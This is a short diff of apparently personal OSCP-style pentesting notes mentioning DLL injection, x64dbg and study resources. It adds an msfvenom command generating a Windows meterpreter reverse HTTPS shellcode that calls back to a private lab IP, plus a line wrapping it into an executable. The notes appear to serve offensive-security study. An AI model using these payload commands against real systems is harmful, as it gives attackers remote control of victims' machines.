@@ -31,10 +31,13 @@ ippsec.rocks
 
 uses dll injection into microsoft updater
 
+sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.49.144 LPORT=4444 -f bin -o shellcode.bin
+
 we can create one by cat shellcode.bin | msfvenom -p - -f exe -a x64 --platform win -o pleasesubscribe.exe
 
 we can open this up in x64dbg
 needs to be done in x64dbg file
+
 
 # oscp tj null list
 
